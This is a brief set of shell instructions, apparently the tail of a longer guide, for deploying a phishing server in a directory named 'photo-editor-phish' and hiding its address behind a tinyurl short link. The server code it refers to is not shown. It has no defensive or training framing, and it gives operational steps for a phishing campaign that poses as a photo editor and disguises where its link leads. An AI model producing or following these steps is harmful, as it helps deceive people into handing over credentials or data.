# 1. Create directory and files
mkdir photo-editor-phish && cd photo-editor-phish
# Save the files above

# 2. Make executable
chmod +x server.py

# 3. Run server
python3 server.py


# Using curl + tinyurl (or deploy your own)
curl -d "url=http://your-server.com" "http://tinyurl.com/api-create.php"